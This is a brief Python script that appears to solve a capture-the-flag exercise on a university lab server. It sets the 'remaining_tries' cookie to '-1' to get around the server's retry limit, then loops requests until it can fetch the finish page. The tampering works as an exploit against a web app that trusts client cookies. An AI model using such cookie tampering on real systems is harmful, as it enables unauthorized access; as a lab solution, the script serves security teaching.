import requests

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23054/"

session = requests.Session()

# First request to get the target number
r = session.get(link + "hello")
text = r.text.split("<br>")
target = int(text[0].split()[-1][:-1])
current = int(text[1].split()[-1]) # Just in case the target is 0, we should stop there
session.cookies.set("remaining_tries", "-1") # Allow infinite requests (server only tests if remaining_tries == "0")

while True:
    # The game always ends 
    # (even if the current number exceeded the target, it will be decremented)
    if current == target:
        r = session.get(link + "finish")
        print(r.text)
        break
    r = session.get(link + "more")
    current = int(r.text.split("<br>")[2].split()[-1])